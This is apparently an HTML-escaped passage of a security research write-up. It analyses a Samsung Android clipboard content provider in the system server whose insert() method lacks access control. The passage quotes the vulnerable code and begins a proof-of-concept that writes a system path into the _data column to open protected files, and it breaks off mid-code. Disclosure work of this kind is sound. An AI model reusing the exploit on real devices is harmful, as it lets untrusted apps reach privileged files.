vdnyYxSRCi-c8\"&gt;&lt;span&gt;In Android, &lt;/span&gt;&lt;span class=\"vdnyYxSRCi-c24\"&gt;&lt;a class=\"vdnyYxSRCi-c61\" href=\"https://developer.android.com/guide/topics/providers/content-providers\"&gt;Content Providers&lt;/a&gt;&lt;/span&gt;&lt;span&gt;&amp;nbsp;manage the storage and system-wide access of different data. Content providers organize their data as tables with columns representing the type of data collected and the rows representing each piece of data. Content providers are &lt;/span&gt;&lt;span class=\"vdnyYxSRCi-c24\"&gt;&lt;a class=\"vdnyYxSRCi-c61\" href=\"https://developer.android.com/guide/topics/providers/content-provider-creating#ContentProvider\"&gt;required to implement six abstract methods&lt;/a&gt;&lt;/span&gt;&lt;span&gt;: &lt;/span&gt;&lt;span class=\"vdnyYxSRCi-c2\"&gt;query&lt;/span&gt;&lt;span&gt;, &lt;/span&gt;&lt;span class=\"vdnyYxSRCi-c2\"&gt;insert&lt;/span&gt;&lt;span&gt;,&lt;/span&gt;&lt;span class=\"vdnyYxSRCi-c2\"&gt;&amp;nbsp;update&lt;/span&gt;&lt;span&gt;, &lt;/span&gt;&lt;span class=\"vdnyYxSRCi-c2\"&gt;delete&lt;/span&gt;&lt;span&gt;, &lt;/span&gt;&lt;span class=\"vdnyYxSRCi-c2\"&gt;getType&lt;/span&gt;&lt;span&gt;, and &lt;/span&gt;&lt;span class=\"vdnyYxSRCi-c2\"&gt;onCreate&lt;/span&gt;&lt;span&gt;. All of these methods besides &lt;/span&gt;&lt;span class=\"vdnyYxSRCi-c2\"&gt;onCreate&lt;/span&gt;&lt;span class=\"vdnyYxSRCi-c7\"&gt;&amp;nbsp;are called by a client application.&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"vdnyYxSRCi-c1 vdnyYxSRCi-c8 vdnyYxSRCi-c14\"&gt;&lt;span class=\"vdnyYxSRCi-c7\"&gt;&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"vdnyYxSRCi-c1 vdnyYxSRCi-c8\"&gt;&lt;span&gt;According to the &lt;/span&gt;&lt;span class=\"vdnyYxSRCi-c24\"&gt;&lt;a class=\"vdnyYxSRCi-c61\" href=\"https://developer.android.com/guide/topics/providers/content-provider-creating#Permissions\"&gt;Android documentation&lt;/a&gt;&lt;/span&gt;&lt;span class=\"vdnyYxSRCi-c7\"&gt;:&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"vdnyYxSRCi-c1 vdnyYxSRCi-c8 vdnyYxSRCi-c26\"&gt;&lt;span&gt;&lt;br&gt;&lt;/span&gt;&lt;span class=\"vdnyYxSRCi-c35 vdnyYxSRCi-c11\"&gt;All applications can read from or write to your provider, even if the underlying data is private, because by default your provider does not have permissions set. To change this, set permissions for your provider in your manifest file, using attributes or child elements of the &amp;lt;provider&amp;gt; element. You can set permissions that apply to the entire provider, or to certain tables, or even to certain records, or all three.&lt;/span&gt;&lt;/p&gt;&lt;h2 class=\"vdnyYxSRCi-c17 vdnyYxSRCi-c8\" id=\"h.q6l9tyie3537\"&gt;&lt;span class=\"vdnyYxSRCi-c16\"&gt;The vulnerability&lt;/span&gt;&lt;/h2&gt;\n &lt;p class=\"vdnyYxSRCi-c1 vdnyYxSRCi-c8\"&gt;&lt;span&gt;Samsung created a custom clipboard content provider that runs within the system server. The &lt;/span&gt;&lt;span class=\"vdnyYxSRCi-c24\"&gt;&lt;a class=\"vdnyYxSRCi-c61\" href=\"https://cs.android.com/android/platform/superproject/+/master:frameworks/base/services/java/com/android/server/SystemServer.java\"&gt;system server&lt;/a&gt;&lt;/span&gt;&lt;span&gt;&amp;nbsp;is a very privileged process on Android that manages many of the services critical to the functioning of the device, such as the WifiService and TimeZoneDetectorService. The system server runs as the privileged &lt;/span&gt;&lt;span class=\"vdnyYxSRCi-c2\"&gt;system&lt;/span&gt;&lt;span&gt;&amp;nbsp;user (UID 1000, &lt;/span&gt;&lt;span class=\"vdnyYxSRCi-c2\"&gt;AID_system&lt;/span&gt;&lt;span&gt;) and under the &lt;/span&gt;&lt;span class=\"vdnyYxSRCi-c2\"&gt;system_server&lt;/span&gt;&lt;span class=\"vdnyYxSRCi-c7\"&gt;&amp;nbsp;SELinux context.&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"vdnyYxSRCi-c1 vdnyYxSRCi-c8 vdnyYxSRCi-c14\"&gt;&lt;span class=\"vdnyYxSRCi-c7\"&gt;&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"vdnyYxSRCi-c1 vdnyYxSRCi-c8\"&gt;&lt;span&gt;Samsung added a custom clipboard content provider to the system server. This custom clipboard provider is specifically for images. In the &lt;/span&gt;&lt;span class=\"vdnyYxSRCi-c2\"&gt;com.android.server.semclipboard.SemClipboardProvider&lt;/span&gt;&lt;span class=\"vdnyYxSRCi-c7\"&gt;&amp;nbsp;class, there are the following variables:&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"vdnyYxSRCi-c1 vdnyYxSRCi-c8\"&gt;&lt;span&gt;&lt;br&gt;&lt;/span&gt;&lt;span class=\"vdnyYxSRCi-c33 vdnyYxSRCi-c34\"&gt;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;DATABASE_NAME = &amp;lsquo;clipboardimage.db&amp;rsquo;&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"vdnyYxSRCi-c1 vdnyYxSRCi-c8\"&gt;&lt;span class=\"vdnyYxSRCi-c34 vdnyYxSRCi-c33\"&gt;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;TABLE_NAME = &amp;lsquo;ClipboardImageTable&amp;rsquo;&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"vdnyYxSRCi-c1 vdnyYxSRCi-c8\"&gt;&lt;span class=\"vdnyYxSRCi-c34 vdnyYxSRCi-c33\"&gt;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;URL = &amp;lsquo;content://com.sec.android.semclipboardprovider/images&amp;rsquo;&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"vdnyYxSRCi-c1 vdnyYxSRCi-c8\"&gt;&lt;span class=\"vdnyYxSRCi-c34 vdnyYxSRCi-c33\"&gt;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;CREATE_TABLE = &amp;quot; CREATE TABLE ClipboardImageTable (id INTEGER PRIMARY KEY AUTOINCREMENT, &amp;nbsp;_data TEXT NOT NULL);&amp;quot;;&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"vdnyYxSRCi-c1 vdnyYxSRCi-c8 vdnyYxSRCi-c14\"&gt;&lt;span class=\"vdnyYxSRCi-c34 vdnyYxSRCi-c33\"&gt;&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"vdnyYxSRCi-c1 vdnyYxSRCi-c8\"&gt;&lt;span class=\"vdnyYxSRCi-c51\"&gt;Unlike content providers that live in &amp;ldquo;normal&amp;rdquo; apps and can restrict access via permissions in their manifest as explained above, content providers in the system server are responsible for restricting access in their own code.&lt;/span&gt;&lt;span class=\"vdnyYxSRCi-c44 vdnyYxSRCi-c49\"&gt;&amp;nbsp;The system server is a single JAR (services.jar) on the firmware image and doesn&amp;rsquo;t have a manifest for any permissions to go in. Therefore it&amp;rsquo;s up to the code within the system server to do its own access checking. &lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"vdnyYxSRCi-c1 vdnyYxSRCi-c8 vdnyYxSRCi-c14\"&gt;&lt;span class=\"vdnyYxSRCi-c7\"&gt;&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"vdnyYxSRCi-c1 vdnyYxSRCi-c8\"&gt;&lt;span class=\"vdnyYxSRCi-c11\"&gt;UPDATE 10 Nov 2022: The system server code is not an app in its own right. Instead its code lives in a JAR, &lt;/span&gt;&lt;span class=\"vdnyYxSRCi-c2\"&gt;services.jar&lt;/span&gt;&lt;span class=\"vdnyYxSRCi-c11\"&gt;. Its manifest is found in &lt;/span&gt;&lt;span class=\"vdnyYxSRCi-c2\"&gt;/system/framework/framework-res.apk&lt;/span&gt;&lt;span class=\"vdnyYxSRCi-c11\"&gt;. In this case, the entry for the &lt;/span&gt;&lt;span class=\"vdnyYxSRCi-c2\"&gt;SemClipboardProvider&lt;/span&gt;&lt;span class=\"vdnyYxSRCi-c11 vdnyYxSRCi-c35\"&gt;&amp;nbsp;in the manifest is:&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"c30 c8 c14 c38\"&gt;&lt;span class=\"vdnyYxSRCi-c33 vdnyYxSRCi-c43\"&gt;&lt;/span&gt;&lt;/p&gt;&lt;a id=\"t.4abf9747174430e2619adf352acba88a7de57bde\"&gt;&lt;/a&gt;&lt;a id=\"t.0\"&gt;&lt;/a&gt;&lt;table class=\"vdnyYxSRCi-c23\"&gt;&lt;tr class=\"vdnyYxSRCi-c22\"&gt;&lt;td class=\"vdnyYxSRCi-c41\" colspan=\"1\" rowspan=\"1\"&gt;\n &lt;p class=\"vdnyYxSRCi-c8 vdnyYxSRCi-c30\"&gt;&lt;span class=\"vdnyYxSRCi-c25\"&gt;&amp;lt;provider&lt;/span&gt;&lt;span class=\"vdnyYxSRCi-c4\"&gt;&amp;nbsp;android:name&lt;/span&gt;&lt;span class=\"vdnyYxSRCi-c0\"&gt;=&lt;/span&gt;&lt;span class=\"vdnyYxSRCi-c4\"&gt;&amp;quot;com.android.server.semclipboard.SemClipboardProvider&amp;quot; android:enabled&lt;/span&gt;&lt;span class=\"vdnyYxSRCi-c0\"&gt;=&lt;/span&gt;&lt;span class=\"vdnyYxSRCi-c4\"&gt;&amp;quot;true&amp;quot; android:exported&lt;/span&gt;&lt;span class=\"vdnyYxSRCi-c0\"&gt;=&lt;/span&gt;&lt;span class=\"vdnyYxSRCi-c4\"&gt;&amp;quot;true&amp;quot; android:multiprocess&lt;/span&gt;&lt;span class=\"vdnyYxSRCi-c0\"&gt;=&lt;/span&gt;&lt;span class=\"vdnyYxSRCi-c4\"&gt;&amp;quot;false&amp;quot; android:authorities&lt;/span&gt;&lt;span class=\"vdnyYxSRCi-c0\"&gt;=&lt;/span&gt;&lt;span class=\"vdnyYxSRCi-c4\"&gt;&amp;quot;com.sec.android.semclipboardprovider&amp;quot; android:singleUser&lt;/span&gt;&lt;span class=\"vdnyYxSRCi-c0\"&gt;=&lt;/span&gt;&lt;span class=\"vdnyYxSRCi-c4\"&gt;&amp;quot;true&amp;quot;&lt;/span&gt;&lt;span class=\"vdnyYxSRCi-c25 vdnyYxSRCi-c33\"&gt;/&amp;gt;&lt;/span&gt;&lt;/p&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;\n &lt;p class=\"c1 c8 c14 c38\"&gt;&lt;span class=\"vdnyYxSRCi-c32\"&gt;&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"vdnyYxSRCi-c1 vdnyYxSRCi-c8 vdnyYxSRCi-c38\"&gt;&lt;span class=\"vdnyYxSRCi-c11 vdnyYxSRCi-c50\"&gt;Like &amp;ldquo;normal&amp;rdquo; app-defined components, the system server could use the &lt;/span&gt;&lt;span class=\"vdnyYxSRCi-c2\"&gt;android:permission&lt;/span&gt;&lt;span class=\"vdnyYxSRCi-c50\"&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=\"vdnyYxSRCi-c43 vdnyYxSRCi-c11 vdnyYxSRCi-c45\"&gt;attribute to control access to the provider, but it does not. Since there is not a permission required to access the SemClipboardProvider via the manifest, any access control must come from the provider code itself. Thanks to Edward Cunningham for pointing this out!&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"vdnyYxSRCi-c1 vdnyYxSRCi-c8 vdnyYxSRCi-c14\"&gt;&lt;span class=\"vdnyYxSRCi-c7\"&gt;&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"vdnyYxSRCi-c1 vdnyYxSRCi-c8 vdnyYxSRCi-c14\"&gt;&lt;span class=\"vdnyYxSRCi-c7\"&gt;&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"vdnyYxSRCi-c1 vdnyYxSRCi-c8\"&gt;&lt;span&gt;The &lt;/span&gt;&lt;span class=\"vdnyYxSRCi-c2\"&gt;ClipboardImageTable&lt;/span&gt;&lt;span&gt;&amp;nbsp;defines only two columns for the table as seen above: &lt;/span&gt;&lt;span class=\"vdnyYxSRCi-c2\"&gt;id&lt;/span&gt;&lt;span&gt;&amp;nbsp;and &lt;/span&gt;&lt;span class=\"vdnyYxSRCi-c2\"&gt;_data&lt;/span&gt;&lt;span&gt;. &lt;/span&gt;&lt;span&gt;The column name &lt;/span&gt;&lt;span class=\"vdnyYxSRCi-c2\"&gt;_data&lt;/span&gt;&lt;span&gt;&amp;nbsp;has a special use in Android content providers.&lt;/span&gt;&lt;span&gt;&amp;nbsp;It can be used with the &lt;/span&gt;&lt;span class=\"vdnyYxSRCi-c2 vdnyYxSRCi-c27\"&gt;&lt;a class=\"vdnyYxSRCi-c61\" href=\"https://developer.android.com/reference/android/content/ContentProvider#openFileHelper(android.net.Uri,%20java.lang.String)\"&gt;openFileHelper&lt;/a&gt;&lt;/span&gt;&lt;span&gt;&amp;nbsp;method to open a file at a specified path. Only the URI of the row in the table is passed to &lt;/span&gt;&lt;span class=\"vdnyYxSRCi-c2\"&gt;openFileHelper&lt;/span&gt;&lt;span&gt;&amp;nbsp;and a &lt;/span&gt;&lt;span class=\"vdnyYxSRCi-c24\"&gt;&lt;a class=\"vdnyYxSRCi-c61\" href=\"https://developer.android.com/reference/android/os/ParcelFileDescriptor\"&gt;ParcelFileDescriptor&lt;/a&gt;&lt;/span&gt;&lt;span&gt;&amp;nbsp;object for the path stored in that row is returned. The &lt;/span&gt;&lt;span class=\"vdnyYxSRCi-c2\"&gt;ParcelFileDescriptor&lt;/span&gt;&lt;span&gt;&amp;nbsp;class then provides the &lt;/span&gt;&lt;span class=\"vdnyYxSRCi-c2 vdnyYxSRCi-c27\"&gt;&lt;a class=\"vdnyYxSRCi-c61\" href=\"https://developer.android.com/reference/android/os/ParcelFileDescriptor#getFd()\"&gt;getFd&lt;/a&gt;&lt;/span&gt;&lt;span&gt;&amp;nbsp;method to get the native file descriptor (fd) for the returned &lt;/span&gt;&lt;span class=\"vdnyYxSRCi-c2\"&gt;ParcelFileDescriptor&lt;/span&gt;&lt;span class=\"vdnyYxSRCi-c7\"&gt;. &lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"vdnyYxSRCi-c1 vdnyYxSRCi-c8 vdnyYxSRCi-c14\"&gt;&lt;span class=\"vdnyYxSRCi-c7\"&gt;&lt;/span&gt;&lt;/p&gt;&lt;a id=\"t.e18ec8258d62d1bc4c9a78a85fafcf74e0c9ab36\"&gt;&lt;/a&gt;&lt;a id=\"t.1\"&gt;&lt;/a&gt;&lt;table class=\"vdnyYxSRCi-c23\"&gt;&lt;tr class=\"vdnyYxSRCi-c19\"&gt;&lt;td class=\"vdnyYxSRCi-c10\" colspan=\"1\" rowspan=\"1\"&gt;\n &lt;p class=\"vdnyYxSRCi-c1\"&gt;&lt;span class=\"vdnyYxSRCi-c4\"&gt;&amp;nbsp; &amp;nbsp; &lt;/span&gt;&lt;span class=\"vdnyYxSRCi-c5\"&gt;public&lt;/span&gt;&lt;span class=\"vdnyYxSRCi-c4\"&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=\"vdnyYxSRCi-c12\"&gt;Uri&lt;/span&gt;&lt;span class=\"vdnyYxSRCi-c4\"&gt;&amp;nbsp;insert&lt;/span&gt;&lt;span class=\"vdnyYxSRCi-c0\"&gt;(&lt;/span&gt;&lt;span class=\"vdnyYxSRCi-c12\"&gt;Uri&lt;/span&gt;&lt;span class=\"vdnyYxSRCi-c4\"&gt;&amp;nbsp;uri&lt;/span&gt;&lt;span class=\"vdnyYxSRCi-c0\"&gt;,&lt;/span&gt;&lt;span class=\"vdnyYxSRCi-c4\"&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=\"vdnyYxSRCi-c12\"&gt;ContentValues&lt;/span&gt;&lt;span class=\"vdnyYxSRCi-c4\"&gt;&amp;nbsp;values&lt;/span&gt;&lt;span class=\"vdnyYxSRCi-c0\"&gt;)&lt;/span&gt;&lt;span class=\"vdnyYxSRCi-c4\"&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=\"vdnyYxSRCi-c0\"&gt;{&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"vdnyYxSRCi-c1\"&gt;&lt;span class=\"vdnyYxSRCi-c4\"&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &lt;/span&gt;&lt;span class=\"vdnyYxSRCi-c5\"&gt;long&lt;/span&gt;&lt;span class=\"vdnyYxSRCi-c4\"&gt;&amp;nbsp;row &lt;/span&gt;&lt;span class=\"vdnyYxSRCi-c0\"&gt;=&lt;/span&gt;&lt;span class=\"vdnyYxSRCi-c4\"&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=\"vdnyYxSRCi-c5\"&gt;this&lt;/span&gt;&lt;span class=\"vdnyYxSRCi-c0\"&gt;.&lt;/span&gt;&lt;span class=\"vdnyYxSRCi-c4\"&gt;database&lt;/span&gt;&lt;span class=\"vdnyYxSRCi-c0\"&gt;.&lt;/span&gt;&lt;span class=\"vdnyYxSRCi-c4\"&gt;insert&lt;/span&gt;&lt;span class=\"vdnyYxSRCi-c0\"&gt;(&lt;/span&gt;&lt;span class=\"vdnyYxSRCi-c4\"&gt;TABLE_NAME&lt;/span&gt;&lt;span class=\"vdnyYxSRCi-c0\"&gt;,&lt;/span&gt;&lt;span class=\"vdnyYxSRCi-c4\"&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=\"vdnyYxSRCi-c18\"&gt;&amp;quot;&amp;quot;&lt;/span&gt;&lt;span class=\"vdnyYxSRCi-c0\"&gt;,&lt;/span&gt;&lt;span class=\"vdnyYxSRCi-c4\"&gt;&amp;nbsp;values&lt;/span&gt;&lt;span class=\"vdnyYxSRCi-c0\"&gt;);&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"vdnyYxSRCi-c1\"&gt;&lt;span class=\"vdnyYxSRCi-c4\"&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &lt;/span&gt;&lt;span class=\"vdnyYxSRCi-c5\"&gt;if&lt;/span&gt;&lt;span class=\"vdnyYxSRCi-c4\"&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=\"vdnyYxSRCi-c0\"&gt;(&lt;/span&gt;&lt;span class=\"vdnyYxSRCi-c4\"&gt;row &lt;/span&gt;&lt;span class=\"vdnyYxSRCi-c0\"&gt;&amp;gt;&lt;/span&gt;&lt;span class=\"vdnyYxSRCi-c4\"&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=\"vdnyYxSRCi-c13\"&gt;0&lt;/span&gt;&lt;span class=\"vdnyYxSRCi-c0\"&gt;)&lt;/span&gt;&lt;span class=\"vdnyYxSRCi-c4\"&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=\"vdnyYxSRCi-c0\"&gt;{&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"vdnyYxSRCi-c1\"&gt;&lt;span class=\"vdnyYxSRCi-c4\"&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &lt;/span&gt;&lt;span class=\"vdnyYxSRCi-c12\"&gt;Uri&lt;/span&gt;&lt;span class=\"vdnyYxSRCi-c4\"&gt;&amp;nbsp;newUri &lt;/span&gt;&lt;span class=\"vdnyYxSRCi-c0\"&gt;=&lt;/span&gt;&lt;span class=\"vdnyYxSRCi-c4\"&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=\"vdnyYxSRCi-c12\"&gt;ContentUris&lt;/span&gt;&lt;span class=\"vdnyYxSRCi-c0\"&gt;.&lt;/span&gt;&lt;span class=\"vdnyYxSRCi-c4\"&gt;withAppendedId&lt;/span&gt;&lt;span class=\"vdnyYxSRCi-c0\"&gt;(&lt;/span&gt;&lt;span class=\"vdnyYxSRCi-c4\"&gt;CONTENT_URI&lt;/span&gt;&lt;span class=\"vdnyYxSRCi-c0\"&gt;,&lt;/span&gt;&lt;span class=\"vdnyYxSRCi-c4\"&gt;&amp;nbsp;row&lt;/span&gt;&lt;span class=\"vdnyYxSRCi-c0\"&gt;);&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"vdnyYxSRCi-c1\"&gt;&lt;span class=\"vdnyYxSRCi-c4\"&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; getContext&lt;/span&gt;&lt;span class=\"vdnyYxSRCi-c0\"&gt;().&lt;/span&gt;&lt;span class=\"vdnyYxSRCi-c4\"&gt;getContentResolver&lt;/span&gt;&lt;span class=\"vdnyYxSRCi-c0\"&gt;().&lt;/span&gt;&lt;span class=\"vdnyYxSRCi-c4\"&gt;notifyChange&lt;/span&gt;&lt;span class=\"vdnyYxSRCi-c0\"&gt;(&lt;/span&gt;&lt;span class=\"vdnyYxSRCi-c4\"&gt;newUri&lt;/span&gt;&lt;span class=\"vdnyYxSRCi-c0\"&gt;,&lt;/span&gt;&lt;span class=\"vdnyYxSRCi-c4\"&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=\"vdnyYxSRCi-c5\"&gt;null&lt;/span&gt;&lt;span class=\"vdnyYxSRCi-c0\"&gt;);&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"vdnyYxSRCi-c1\"&gt;&lt;span class=\"vdnyYxSRCi-c4\"&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &lt;/span&gt;&lt;span class=\"vdnyYxSRCi-c5\"&gt;return&lt;/span&gt;&lt;span class=\"vdnyYxSRCi-c4\"&gt;&amp;nbsp;newUri&lt;/span&gt;&lt;span class=\"vdnyYxSRCi-c0\"&gt;;&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"vdnyYxSRCi-c1\"&gt;&lt;span class=\"vdnyYxSRCi-c4\"&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &lt;/span&gt;&lt;span class=\"vdnyYxSRCi-c0\"&gt;}&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"vdnyYxSRCi-c1\"&gt;&lt;span class=\"vdnyYxSRCi-c4\"&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &lt;/span&gt;&lt;span class=\"vdnyYxSRCi-c5\"&gt;throw&lt;/span&gt;&lt;span class=\"vdnyYxSRCi-c4\"&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=\"vdnyYxSRCi-c5\"&gt;new&lt;/span&gt;&lt;span class=\"vdnyYxSRCi-c4\"&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=\"vdnyYxSRCi-c12\"&gt;SQLException&lt;/span&gt;&lt;span class=\"vdnyYxSRCi-c0\"&gt;(&lt;/span&gt;&lt;span class=\"vdnyYxSRCi-c18\"&gt;&amp;quot;Fail to add a new record into &amp;quot;&lt;/span&gt;&lt;span class=\"vdnyYxSRCi-c4\"&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=\"vdnyYxSRCi-c0\"&gt;+&lt;/span&gt;&lt;span class=\"vdnyYxSRCi-c4\"&gt;&amp;nbsp;uri&lt;/span&gt;&lt;span class=\"vdnyYxSRCi-c0\"&gt;);&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"vdnyYxSRCi-c1\"&gt;&lt;span class=\"vdnyYxSRCi-c4\"&gt;&amp;nbsp; &amp;nbsp; &lt;/span&gt;&lt;span class=\"vdnyYxSRCi-c0\"&gt;}&lt;/span&gt;&lt;/p&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;\n &lt;p class=\"vdnyYxSRCi-c1 vdnyYxSRCi-c8 vdnyYxSRCi-c14\"&gt;&lt;span class=\"vdnyYxSRCi-c7\"&gt;&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"vdnyYxSRCi-c1 vdnyYxSRCi-c8\"&gt;&lt;span&gt;The function above is the vulnerable &lt;/span&gt;&lt;span class=\"vdnyYxSRCi-c2\"&gt;insert()&lt;/span&gt;&lt;span&gt;&amp;nbsp;method in &lt;/span&gt;&lt;span class=\"vdnyYxSRCi-c2\"&gt;com.android.server.semclipboard.SemClipboardProvider&lt;/span&gt;&lt;span&gt;. &lt;/span&gt;&lt;span&gt;There is no access control included in this function&lt;/span&gt;&lt;span&gt;&amp;nbsp;so any app, including the &lt;/span&gt;&lt;span class=\"vdnyYxSRCi-c2\"&gt;untrusted_app&lt;/span&gt;&lt;span&gt;&amp;nbsp;SELinux context, can modify the &lt;/span&gt;&lt;span class=\"vdnyYxSRCi-c2\"&gt;_data&lt;/span&gt;&lt;span&gt;&amp;nbsp;column directly&lt;/span&gt;&lt;span&gt;.&lt;/span&gt;&lt;span&gt;&amp;nbsp;By calling &lt;/span&gt;&lt;span class=\"vdnyYxSRCi-c2\"&gt;insert&lt;/span&gt;&lt;span class=\"vdnyYxSRCi-c7\"&gt;, an app can open files via the system server that it wouldn&amp;rsquo;t usually be able to open on its own.&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"vdnyYxSRCi-c1 vdnyYxSRCi-c8 vdnyYxSRCi-c14\"&gt;&lt;span class=\"vdnyYxSRCi-c7\"&gt;&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"vdnyYxSRCi-c1 vdnyYxSRCi-c8\"&gt;&lt;span class=\"vdnyYxSRCi-c7\"&gt;The exploit triggered the vulnerability with the following code from an untrusted application on the device. This code returned a raw file descriptor.&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"vdnyYxSRCi-c1 vdnyYxSRCi-c8 vdnyYxSRCi-c14\"&gt;&lt;span class=\"vdnyYxSRCi-c7\"&gt;&lt;/span&gt;&lt;/p&gt;&lt;a id=\"t.c76d3f2b81f0b5658486a0f765013fc550b7979d\"&gt;&lt;/a&gt;&lt;a id=\"t.2\"&gt;&lt;/a&gt;&lt;table class=\"vdnyYxSRCi-c23\"&gt;&lt;tr class=\"vdnyYxSRCi-c19\"&gt;&lt;td class=\"vdnyYxSRCi-c10\" colspan=\"1\" rowspan=\"1\"&gt;\n &lt;p class=\"vdnyYxSRCi-c1\"&gt;&lt;span class=\"vdnyYxSRCi-c12\"&gt;ContentValues&lt;/span&gt;&lt;span class=\"vdnyYxSRCi-c4\"&gt;&amp;nbsp;vals &lt;/span&gt;&lt;span class=\"vdnyYxSRCi-c0\"&gt;=&lt;/span&gt;&lt;span class=\"vdnyYxSRCi-c4\"&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=\"vdnyYxSRCi-c5\"&gt;new&lt;/span&gt;&lt;span class=\"vdnyYxSRCi-c4\"&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=\"vdnyYxSRCi-c12\"&gt;ContentValues&lt;/span&gt;&lt;span class=\"vdnyYxSRCi-c0\"&gt;();&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"vdnyYxSRCi-c1\"&gt;&lt;span class=\"vdnyYxSRCi-c4\"&gt;vals&lt;/span&gt;&lt;span class=\"vdnyYxSRCi-c0\"&gt;.&lt;/span&gt;&lt;span class=\"vdnyYxSRCi-c4\"&gt;put&lt;/span&gt;&lt;span class=\"vdnyYxSRCi-c0\"&gt;(&lt;/span&gt;&lt;span class=\"vdnyYxSRCi-c18\"&gt;&amp;quot;_data&amp;quot;&lt;/span&gt;&lt;span class=\"vdnyYxSRCi-c0\"&gt;,&lt;/span&gt;&lt;span class=\"vdnyYxSRCi-c4\"&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=\"vdnyYxSRCi-c18\"&gt;&amp;quot;/data/system/users/0/newFile.bin&amp;quot;&lt;/span&gt;&lt;span class=\"vdnyYxSRCi-c0\"&gt;);&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"vdnyYxSRCi-c1\"&gt;&lt;span class=\"vdnyYxSRCi-c4\"&gt;URI semclipboard_uri &lt;/span&gt;&lt;span class=\"vdnyYxSRCi-c0\"&gt;=&lt;/span&gt;&lt;span class=\"vdnyYxSRCi-c4\"&gt;&amp;nbsp;URI&lt;/span&gt;&lt;span class=\"vdnyYxSRCi-c0\"&gt;.&lt;/span&gt;&lt;span class=\"vdnyYxSRCi-c4\"&gt;parse&lt;/span&gt;&lt;span class=\"vdnyYxSRCi-c0\"&gt;(&lt;/span&gt;&lt;span class=\"vdnyYxSRCi-c18\"&gt;&amp;quot;content://com.sec.android.semclipboardprovider&amp;quot;&lt;/span&gt;&lt;span class=\"vdnyYxSRCi-c0\"&gt;)&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"vdnyYxSRCi-c1\"&gt;&lt;span class=\"vdnyYxSRCi-c12\"&gt;ContentResolver&lt;/span&gt;&lt;span class=\"vdnyYxSRCi-c4\"&gt;&amp;nbsp;resolver &lt;/span&gt;&lt;span class=\"vdnyYxSRCi-c0\"&gt;=&lt;/span&gt;&lt;span class=\"vdnyYxSRCi-c4\"&gt;&amp;nbsp;getContentResolver&lt;/span&gt;&lt;span class=\"vdnyYxSRCi-c0\"&gt;();&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"vdnyYxSRCi-c1\"&gt;&lt;span class=\"vdnyYxSRCi-c4\"&gt;URI newFile_uri &lt;/span&gt;&lt;span class=\"vdnyYxSRCi-c0\"&gt;=&lt;/span&gt;&lt;span 